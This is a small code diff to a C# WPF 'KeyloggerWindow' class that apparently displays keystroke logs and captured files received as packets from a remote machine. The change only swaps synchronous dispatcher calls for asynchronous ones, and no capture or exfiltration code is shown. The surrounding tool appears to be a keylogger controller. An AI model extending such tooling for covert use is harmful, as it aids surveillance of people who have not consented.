@@ -67,7 +67,7 @@ public partial class KeyloggerWindow : Window
     {
         var data = JsonConvert.DeserializeObject<KeyloggerLogsResultData>(pkt.Data);
         if (data == null) return;
-        Dispatcher.Invoke(() =>
+        Dispatcher.BeginInvoke(() =>
         {
             _capturing = data.IsRunning;
             UpdateBadge();
@@ -85,7 +85,7 @@ public partial class KeyloggerWindow : Window
     {
         var data = JsonConvert.DeserializeObject<KeyloggerFilesResultData>(pkt.Data);
         if (data == null) return;
-        Dispatcher.Invoke(() =>
+        Dispatcher.BeginInvoke(() =>
         {
             _capturing = data.IsRunning;
             UpdateBadge();
@@ -102,7 +102,7 @@ public partial class KeyloggerWindow : Window
     {
         var data = JsonConvert.DeserializeObject<KeyloggerFileContentData>(pkt.Data);
         if (data == null) return;
-        Dispatcher.Invoke(() =>
+        Dispatcher.BeginInvoke(() =>
         {
             TxtLog.Text = data.Content;
             TxtViewerTitle.Text = data.Filename;
